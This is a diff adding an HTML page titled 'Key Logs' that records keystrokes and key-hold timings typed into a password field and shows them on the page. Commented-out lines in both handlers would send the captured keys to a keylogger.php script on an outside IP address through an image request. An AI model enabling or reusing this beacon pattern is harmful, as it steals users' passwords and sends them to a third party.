@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+</head>
+<body>
+
+	<h1>Key Logs</h1>
+
+	<input type="password" id = "text">
+	<p id="demo"></p>
+
+<script>
+
+var buffer = [];
+var oldstroke = new Object();
+var newstroke = new Object();
+
+document.getElementById("text").onkeydown = function(e) {
+	//var keys='';
+	//get = window.event?event:e;
+	//key = get.keyCode?get.keyCode:get.charCode;
+	//key = String.fromCharCode(key);
+	//keys+=key;
+	//alert("function");
+
+	var timestamp = Date.now() | 0;
+    var stroke = {
+        key: e.key,
+        time: timestamp
+
+    };
+    //var data = encodeURIComponent(JSON.stringify(buffer));
+    if(stroke["key"] == "Backspace")
+    {
+    	buffer = [];
+    	document.getElementById("text").value = "";
+    }
+
+    else if(stroke["key"] != "Shift"){
+    	/*if(stroke["key"] != newstroke.key){
+    		var newdown = stroke;
+    		var olddown = newtsroke;
+    		var time = olddown.time - newdown.time;
+
+    		oldstroke.time = newstroke.time - ;
+
+    	}*/
+    	buffer.push(stroke);
+    	newstroke = stroke;
+    }
+
+	window.setInterval(function(){
+	//new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
+		document.getElementById("demo").innerHTML = JSON.stringify(buffer);
+	}, 1000);
+}
+
+
+document.getElementById("text").onkeyup = function(e) {
+	//var keys='';
+	//get = window.event?event:e;
+	//key = get.keyCode?get.keyCode:get.charCode;
+	//key = String.fromCharCode(key);
+	//keys+=key;
+	//alert("function");
+	var timestamp = Date.now() | 0;
+    var stroke = {
+        key: e.key,
+        time: timestamp
+    };
+
+    //var data = encodeURIComponent(JSON.stringify(buffer));
+
+    if(stroke["key"] == "Backspace")
+    {
+    	buffer = [];
+    	document.getElementById("text").value = "";
+    }
+    else if(stroke["key"] != "Shift")
+    {
+    	buffer.push(stroke);
+    	var up = buffer.pop();
+    	var down = buffer.pop();
+    	var time = up.time-down.time;
+
+    	newstroke.key=stroke.key;
+    	newstroke.time=time;
+    	oldstroke = newstroke;
+    	buffer.push(newstroke);
+
+
+    }
+
+
+	window.setInterval(function(){
+	//new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
+		document.getElementById("demo").innerHTML = JSON.stringify(buffer);
+	}, 1000);
+}
+
+</script>
+</body>
+</html>
